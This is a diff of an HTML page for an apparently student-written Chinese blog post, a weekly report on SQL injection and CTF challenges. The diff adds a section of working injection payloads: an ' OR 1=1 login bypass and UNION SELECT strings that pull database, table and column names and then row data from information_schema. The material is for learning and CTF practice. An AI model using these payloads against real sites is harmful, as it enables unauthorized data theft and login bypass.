@@ -23,7 +23,7 @@
   <meta property="og:image:alt" content="2026 级第一周周报：SQL 注入与几种 CTF 题型 · whymm">
   
   <meta property="article:published_time" content="2026-11-16T13:00:00.000Z">
-  <meta property="article:modified_time" content="2026-11-16T13:11:21.042Z">
+  <meta property="article:modified_time" content="2026-11-17T07:35:34.056Z">
   
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="2026 级第一周周报：SQL 注入与几种 CTF 题型 · whymm">
@@ -107,9 +107,9 @@
         </span>
         <span class="post-meta-item">
           <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7.5V12l3 2"/></svg>
-          8 分钟阅读
+          9 分钟阅读
         </span>
-        <span class="post-meta-item">3188 字</span>
+        <span class="post-meta-item">3551 字</span>
         
         
         <span class="post-meta-item post-author">
@@ -134,7 +134,7 @@
         
         <details class="toc-mobile">
           <summary>目录</summary>
-          <div class="toc-mobile-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">一、SQL 核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、SQL 注入的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%80%E4%BA%9B-SQL-%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE"><span class="toc-text">三、一些 SQL 注入题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-UNION"><span class="toc-text">1 [数字型注入 + 报错回显 + UNION]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E6%A1%86%EF%BC%9A%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">2 [登录框：万能密码]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3 [布尔盲注]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4-union-select-%E7%A9%BA%E6%A0%BC-%E6%B3%A8%E9%87%8A%EF%BC%8C%E7%BB%95%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-text">4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]</span></a></li></ol></li></ol></div>
+          <div class="toc-mobile-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">一、SQL 核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、SQL 注入的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95"><span class="toc-text">三、SQL 常用语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%B8%80%E4%BA%9B-SQL-%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE"><span class="toc-text">四、一些 SQL 注入题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-UNION"><span class="toc-text">1 [数字型注入 + 报错回显 + UNION]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E6%A1%86%EF%BC%9A%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">2 [登录框：万能密码]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3 [布尔盲注]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4-union-select-%E7%A9%BA%E6%A0%BC-%E6%B3%A8%E9%87%8A%EF%BC%8C%E7%BB%95%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-text">4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]</span></a></li></ol></li></ol></div>
         </details>
         
 
@@ -149,15 +149,31 @@
 
 <p>用户就能在不知道密码的情况下登录。</p>
 <p>解读：<code>--</code> 是 SQL 的注释符号，后面的内容会被注释掉，此时 SQL 语句等价于 <code>select * from user where username=&#39;&#39; or 1=1</code>，而 <code>1=1</code> 永远为真，所以会查询出所有用户信息，实现「免密码登录」—— 这就是最基础的 SQL 注入。</p>
-<p>当然还有许多其他的语法，这需要我们不断的积累。这里给一张常用的名词表：</p>
-<p><img src="/images/week1/01-schema-tables.png" alt="查库名 &#x2F; 表名 &#x2F; 字段名最常用的三张表"></p>
 <h2 id="二、SQL-注入的危害"><a href="#二、SQL-注入的危害" class="headerlink" title="二、SQL 注入的危害"></a>二、SQL 注入的危害</h2><ul>
 <li>数据泄露：获取用户信息、密码、订单等敏感数据。</li>
 <li>权限提升：读到后台账号、用 <code>into outfile</code> 写文件，进一步执行系统命令拿下服务器。</li>
 <li>数据篡改：<code>update</code>、<code>delete</code> 被打进去，整张表甚至整个库都可能被清掉。</li>
 <li>绕过业务逻辑：登录校验、支付金额、管理员权限判断，都可能被一句 <code>or 1=1</code> 直接跳过。</li>
 </ul>
-<h2 id="三、一些-SQL-注入题目"><a href="#三、一些-SQL-注入题目" class="headerlink" title="三、一些 SQL 注入题目"></a>三、一些 SQL 注入题目</h2><p>我按我认为的难度分了一下级。</p>
+<h2 id="三、SQL-常用语法"><a href="#三、SQL-常用语法" class="headerlink" title="三、SQL 常用语法"></a>三、SQL 常用语法</h2><ol>
+<li><p>登录绕过</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1-- -</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库名</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取表名</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取字段</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;你获得的表名&#x27;</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获得内容</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> GROUP_CONCAT(字段) <span class="keyword">FROM</span> 表名),<span class="number">3</span> <span class="comment">-- -</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>当然还有许多其他的语法，这需要我们不断的积累。这里给一张常用的名词表：</p>
+<p><img src="/images/week1/01-schema-tables.png" alt="查库名 &#x2F; 表名 &#x2F; 字段名最常用的三张表"></p>
+<h2 id="四、一些-SQL-注入题目"><a href="#四、一些-SQL-注入题目" class="headerlink" title="四、一些 SQL 注入题目"></a>四、一些 SQL 注入题目</h2><p>我按我认为的难度分了一下级。</p>
 <h3 id="1-数字型注入-报错回显-UNION"><a href="#1-数字型注入-报错回显-UNION" class="headerlink" title="1 [数字型注入 + 报错回显 + UNION]"></a>1 [数字型注入 + 报错回显 + UNION]</h3><p><strong>难度：拉玩了</strong></p>
 <p>先输一个空值看看报错，很多时候报错里会直接把后台语句打出来：</p>
 <p><img src="/images/week1/04-query-error.png" alt="id 传空值时，报错里直接打印了后台 SQL"></p>
@@ -273,7 +289,7 @@
       <aside class="post-aside">
         <div class="toc-wrap">
           <div class="toc-title"><span>目录</span><b>TOC</b></div>
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">一、SQL 核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、SQL 注入的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%80%E4%BA%9B-SQL-%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE"><span class="toc-text">三、一些 SQL 注入题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-UNION"><span class="toc-text">1 [数字型注入 + 报错回显 + UNION]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E6%A1%86%EF%BC%9A%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">2 [登录框：万能密码]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3 [布尔盲注]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4-union-select-%E7%A9%BA%E6%A0%BC-%E6%B3%A8%E9%87%8A%EF%BC%8C%E7%BB%95%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-text">4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">一、SQL 核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、SQL 注入的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL-%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95"><span class="toc-text">三、SQL 常用语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%B8%80%E4%BA%9B-SQL-%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE"><span class="toc-text">四、一些 SQL 注入题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE-UNION"><span class="toc-text">1 [数字型注入 + 报错回显 + UNION]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%99%BB%E5%BD%95%E6%A1%86%EF%BC%9A%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-text">2 [登录框：万能密码]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3 [布尔盲注]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4-union-select-%E7%A9%BA%E6%A0%BC-%E6%B3%A8%E9%87%8A%EF%BC%8C%E7%BB%95%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-text">4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]</span></a></li></ol></li></ol>
         </div>
       </aside>
       
